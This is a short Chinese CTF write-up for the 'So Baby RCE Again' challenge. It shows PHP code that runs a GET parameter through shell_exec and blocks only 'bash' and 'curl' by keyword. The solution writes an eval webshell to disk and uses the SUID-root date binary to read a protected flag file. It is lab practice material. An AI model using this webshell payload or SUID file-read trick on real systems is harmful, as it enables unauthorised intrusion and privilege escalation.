---
title: '[NewStarCTF 公开赛赛道]So Baby RCE Again'
date: 2025-02-02 22:49:33
tags: 命令执行
categories: 刷题笔记
---

## [NewStarCTF 公开赛赛道]So Baby RCE Again

```
<?php
error_reporting(0);
if(isset($_GET["cmd"])){
    if(preg_match('/bash|curl/i',$_GET["cmd"])){
        echo "Hacker!";
    }else{
        shell_exec($_GET["cmd"]);
    }
}else{
    show_source(__FILE__);
}
```

无回显rce，我们可以通过写马来查看flag

```
?cmd=echo '11111<?php @eval($_POST[1])?>' > webshell.php
```

写入后我们连接蚁剑，但我们好像无法读取flag

![image-20250202230237702](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502022302753.png)

用终端读取，提示我们权限不够

![image-20250202230331757](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502022303795.png)

我们查看文件权限

![image-20250202230514981](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502022305020.png)

我们发现有x权限且属主为root

找到正在系统上运行的所有SUID可执行文件，发现/bin/date有s权限

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/13d98dbd91a7e16fe80a45518b00e681.png)

```
# 查找所有具有SUID权限且属主为root的文件

find / -user root -perm -4000 -print 2>/dev/null
```

利用date命令读取文件，`date -f 文件名`

得到flag

![image-20250202230736833](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502022307862.png)
